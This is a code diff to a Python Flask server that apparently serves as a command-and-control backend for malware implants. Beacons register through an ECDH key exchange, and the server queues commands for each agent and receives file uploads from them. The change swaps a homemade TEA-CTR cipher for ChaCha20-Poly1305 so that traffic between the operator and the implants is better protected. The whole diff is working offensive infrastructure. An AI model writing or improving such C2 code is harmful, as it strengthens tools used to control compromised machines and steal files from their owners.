@@ -7,59 +7,7 @@ from cryptography.hazmat.primitives.asymmetric.ec import (
     ECDH, generate_private_key, SECP256R1, EllipticCurvePublicKey
 )
 from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
-
-# ---------------------------------------------------------------------------
-# TEA-CTR encryption — key is derived per-agent via ECDH, not hardcoded
-# ---------------------------------------------------------------------------
-
-def _tea_encrypt(v, k):
-    delta = 0x9e3779b9
-    s = 0
-    for _ in range(32):
-        s  = (s + delta) & 0xFFFFFFFF
-        v0 = v[0]; v1 = v[1]
-        v0 = (v0 + (((v1 << 4) + k[0]) ^ (v1 + s) ^ ((v1 >> 5) + k[1]))) & 0xFFFFFFFF
-        v1 = (v1 + (((v0 << 4) + k[2]) ^ (v0 + s) ^ ((v0 >> 5) + k[3]))) & 0xFFFFFFFF
-        v[0], v[1] = v0, v1
-    return v
-
-def _tea_ctr_xor(key, nonce_int, counter, data):
-    k   = struct.unpack('<4I', key)
-    ctr = nonce_int + counter
-    out = bytearray()
-    for off in range(0, len(data), 8):
-        stream = struct.pack('<Q', ctr)
-        v      = list(struct.unpack('<2I', stream))
-        v      = _tea_encrypt(v, k)
-        stream = struct.pack('<2I', v[0], v[1])
-        chunk  = data[off:off + 8]
-        out   += bytes(b ^ stream[i] for i, b in enumerate(chunk))
-        ctr   += 1
-    return bytes(out)
-
-def decrypt_request(key: bytes, data: bytes) -> bytes:
-    if len(data) < 8:
-        return b''
-    nonce = struct.unpack('<Q', data[:8])[0]
-    return _tea_ctr_xor(key, nonce, 0, data[8:])
-
-def encrypt_response(key: bytes, plaintext: bytes) -> bytes:
-    nonce  = struct.unpack('<Q', os.urandom(8))[0]
-    cipher = _tea_ctr_xor(key, nonce, 0, plaintext)
-    return struct.pack('<Q', nonce) + cipher
-
-# ---------------------------------------------------------------------------
-# ECDH-P256 key exchange
-# Beacon sends:  0x04 || X[32] || Y[32]  (65-byte X9.62 uncompressed pubkey)
-# Server replies: 0x04 || X[32] || Y[32] || uuid_str  (65 + 36 = 101 bytes)
-# Both sides derive: SHA-256(shared_secret)[:16]  →  16-byte TEA key
-# ---------------------------------------------------------------------------
-
-def ecdh_derive_tea_key(our_priv, peer_pub_bytes: bytes) -> bytes:
-    """Given our private key and the peer's raw 65-byte X9.62 pubkey, return the 16-byte TEA key."""
-    peer_pub    = EllipticCurvePublicKey.from_encoded_point(SECP256R1(), peer_pub_bytes)
-    shared      = our_priv.exchange(ECDH(), peer_pub)
-    return hashlib.sha256(shared).digest()[:16]
+from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
 
 # ---------------------------------------------------------------------------
 # Flask app
@@ -76,6 +24,42 @@ STATE_FILE    = "agents.json"
 
 _print_lock     = threading.Lock()
 _current_prompt = ""
+
+# ---------------------------------------------------------------------------
+# ChaCha20-Poly1305 AEAD encryption — key is derived per-agent via ECDH
+# ---------------------------------------------------------------------------
+
+def decrypt_request(key: bytes, data: bytes) -> bytes:
+    """Decrypt ChaCha20-Poly1305: [12-byte nonce][ciphertext+tag]"""
+    if len(data) < 12:
+        return b''
+    nonce = data[:12]
+    ciphertext = data[12:]
+    try:
+        cipher = ChaCha20Poly1305(key)
+        return cipher.decrypt(nonce, ciphertext, None)
+    except Exception:
+        return b''
+
+def encrypt_response(key: bytes, plaintext: bytes) -> bytes:
+    """Encrypt ChaCha20-Poly1305: [12-byte nonce][ciphertext+tag]"""
+    nonce = os.urandom(12)
+    cipher = ChaCha20Poly1305(key)
+    ciphertext = cipher.encrypt(nonce, plaintext, None)
+    return nonce + ciphertext
+
+# ---------------------------------------------------------------------------
+# ECDH-P256 key exchange
+# Beacon sends:  0x04 || X[32] || Y[32]  (65-byte X9.62 uncompressed pubkey)
+# Server replies: 0x04 || X[32] || Y[32] || uuid_str  (65 + 36 = 101 bytes)
+# Both sides derive: SHA-256(shared_secret)[:32]  →  32-byte ChaCha20-Poly1305 key
+# ---------------------------------------------------------------------------
+
+def ecdh_derive_session_key(our_priv, peer_pub_bytes: bytes) -> bytes:
+    """Given our private key and the peer's raw 65-byte X9.62 pubkey, return the 32-byte ChaCha20-Poly1305 key."""
+    peer_pub    = EllipticCurvePublicKey.from_encoded_point(SECP256R1(), peer_pub_bytes)
+    shared      = our_priv.exchange(ECDH(), peer_pub)
+    return hashlib.sha256(shared).digest()  # full 32 bytes for ChaCha20-Poly1305
 
 # ---------------------------------------------------------------------------
 # Terminal primitives (unchanged)
@@ -238,19 +222,19 @@ def route_register():
         server_pub_bytes = server_priv.public_key().public_bytes(
             Encoding.X962, PublicFormat.UncompressedPoint
         )
-        # Derive the per-agent TEA key
-        tea_key = ecdh_derive_tea_key(server_priv, beacon_pub_bytes)
+        # Derive the per-agent ChaCha20-Poly1305 key (32 bytes)
+        session_key = ecdh_derive_session_key(server_priv, beacon_pub_bytes)
     except Exception as e:
         async_log(f"ECDH failed: {e}", "err")
         return b"error", 500
 
     aid                = str(uuid.uuid4())
-    agents[aid]        = new_agent(tea_key)
+    agents[aid]        = new_agent(session_key)
     command_queue[aid] = None
 
     async_log(
         f"Agent registered  id={c(aid[:8], CYAN)}  "
-        f"key={c(tea_key.hex(), DIM)}",
+        f"key={c(session_key.hex(), DIM)}",
         "ok"
     )
     save_state()
@@ -339,7 +323,7 @@ def route_upload(aid, filename):
     async_log(f"Upload  {c(filename, CYAN)}  {fmt_bytes(len(plain))}  from {c(aid[:8], CYAN)}", "up")
     return encrypt_response(key, b"OK"), 200
 
-
+# unused right now just not important
 @app.route("/download/<aid>/<filename>", methods=["POST"])
 def route_download(aid, filename):
     if aid not in agents:
